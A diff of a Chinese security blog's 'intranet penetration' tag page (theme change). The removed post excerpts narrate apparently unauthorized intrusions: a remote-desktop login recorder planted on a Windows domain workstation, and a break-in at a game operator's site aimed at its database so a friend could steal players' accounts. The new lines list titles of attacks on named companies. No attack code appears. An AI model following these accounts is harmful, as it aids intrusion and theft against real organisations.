-      
-      </p>
-      
-      <p>
-          <a href="/852.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/1090.seo/" title="渗透中国钢铁商城" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-21T12:12:12.000Z" itemprop="datePublished">
-          2012-06-21
-      </time>
+    <h1 itemprop="name">渗透中国钢铁商城</h1>
     
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>,
-    
-    <a href='/tag/3389/'>3389</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/566.seo/">小记一次渗透过程：一台工作站后面的大型内网</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>小记一次渗透过程：一台工作站后面的大型内网</p>  <p>作者：本地牛   <br /><a href="http://niuzu.blog.51cto.com/">http://niuzu.blog.51cto.com/</a></p>  <p>微博：</p>  <p><a href="http://weibo.com/2052543207/profile/">http://weibo.com/2052543207/profile/</a></p>  <p>域服务器的作用</p>  <p>1.安全集中管理 统一安全策略   <br />2.软件集中管理 按照公司要求限定所有机器只能运行必需的办公软件。    <br />3.环境集中管理 利用AD可以统一客户端桌面,IE,TCP/IP等设置    <br />4.活动目录是企业基础架构的根本，为公司整体统一管理做基础 其它isa,exchange,防病毒服务器，补丁分发服务器，文件服务器等服务依赖于域服务器。    <br />域控制器（Domain Controller，简写为DC）”</p>  <p>过程如下：</p>  <p>2天前对一台WIN2003主机做<a href="http://ha.cker.in/tag/oracle" target="_blank">ORACLE</a>安全测试，然后装了<a href="http://ha.cker.in" target="_blank">3389</a>登陆记录软件。    <br />然后昨天登陆看看此机的数据库设置情况时发现此机其实是DC下属的一台工作站</p>  <p><a href="http://www.2cto.com/uploadfile/2012/0225/20120225013116618.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/75559879257e_3AC6/clip_image001.jpg" width="423" height="316" /></a></p>  <p>远程桌面登陆后查看电脑名称获得DC域名。</p>  <p><a href="http://www.2cto.com/uploadfile/2012/0225/20120225013125220.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/75559879257e_3AC6/clip_image002.jpg" width="449" height="498" /></a></p>
-      
-      </p>
-      
-      <p>
-          <a href="/566.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2014-07-31T14:43:24.000Z" itemprop="datePublished">2014-07-31</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T10:07:55.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-    
-    | 
-    <a href='/tag/内网渗透/'>内网渗透</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/499.seo/">渗透某知名游戏代理商内网全程</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>平常入侵只是写个手记给自己看，这篇烂文也是改自我上次和朋友入侵游戏代理商时的手记，这也是我第一次写入侵类的文章，仅为大家提供一条思路，希望大家喜欢。   <br />一、起因    <br />这天刚一上Q，经常说自己是黑客的“神X月”（他不让我说他网名）就叫我和他一起搞一个游戏官方站，原因是他的一个朋友要他帮忙盗这个游戏的号，神X月没办法，就只好去搞官方拿数据库了。听了他的话我爆汗了1分钟，然后就和他开始了渗透。    <br />二、郁闷的开始    <br />大家都知道，游戏官方站几乎是没有漏洞的。神X月给了我这个游戏的官方网址<em>e.<em>**</em></em>o.com，是个二级域名，网站是asp.net页面，如图1所示。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/3538ffbe3561_1DD5/clip_image001.jpg" width="579" height="245" />    <br />一级域名是一个游戏代理商，如图2所示。    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/3538ffbe3561_1DD5/clip_image002.jpg" width="579" height="157" />    <br />手工检测了一下，没有明显的注入漏洞，再用了几个工具扫都扫不出注入点，注入这条路断了～～郁闷中…..    <br />忽然，想到了asp.net可能有爆路径的漏洞，不管怎样，获得多一点信息总是好的，于是马上测试了一下，无功而返，然后再用几个比较老的asp.net漏洞检测工具对其进行了检测，照样是无功而返。继续郁闷…..问了下神X月的进展如何，他说没一点进展，唉，看来是没搞了～～    <br />三、成功初现    <br />在我准备放弃的时候，突然看到上传玩家照片的功能，如图3所示。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/499.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/952.seo/" title="对国外某hotel的内网域渗透案例" itemprop="url">
   
-  <nav class="pagination" role="pagination">
+    <h1 itemprop="name">对国外某hotel的内网域渗透案例</h1>
     
-    <span class="page-number">Page 1 of 2</span>
-    <a class="older-posts" href="/tag/内网渗透/page/2/">Older Posts →</a>
+    <time datetime="2012-12-09T06:42:48.000Z" itemprop="datePublished">2012-12-09</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/852.seo/" title="对居然之家的一次内网渗透" itemprop="url">
+  
+    <h1 itemprop="name">对居然之家的一次内网渗透</h1>
+    
+    <time datetime="2012-09-25T05:56:48.000Z" itemprop="datePublished">2012-09-25</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/566.seo/" title="小记一次渗透过程：一台工作站后面的大型内网" itemprop="url">
+  
+    <h1 itemprop="name">小记一次渗透过程：一台工作站后面的大型内网</h1>
+    
+    <time datetime="2012-06-21T12:12:12.000Z" itemprop="datePublished">2012-06-21</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/499.seo/" title="渗透某知名游戏代理商内网全程" itemprop="url">
+  
+    <h1 itemprop="name">渗透某知名游戏代理商内网全程</h1>
+    
+    <time datetime="2012-06-12T10:07:55.000Z" itemprop="datePublished">2012-06-12</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <span class="page-number current">1</span><a class="page-number" href="/tag/内网渗透/page/2/">2</a><a class="extend next" rel="next" href="/tag/内网渗透/page/2/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
